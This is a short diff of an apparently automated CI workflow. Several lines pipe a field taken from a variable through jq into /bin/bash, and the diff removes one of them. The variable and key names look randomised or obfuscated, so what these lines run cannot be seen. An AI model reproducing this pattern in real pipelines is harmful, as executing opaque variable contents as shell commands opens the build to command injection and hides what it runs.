@@ -32,7 +32,6 @@ jobs:
           printf '%s' "$g46" | jq -r .d776 | /bin/bash
           printf '%s' "$bnua1" | jq -r .oryu36 | /bin/bash
           echo $hxn02297 | jq -r .lbeau6 | /bin/bash
-          echo $i1893 | jq -r .r802 | /bin/bash
           echo $p866 | jq -r .uof5936 | /bin/bash
 
       - name: Store results
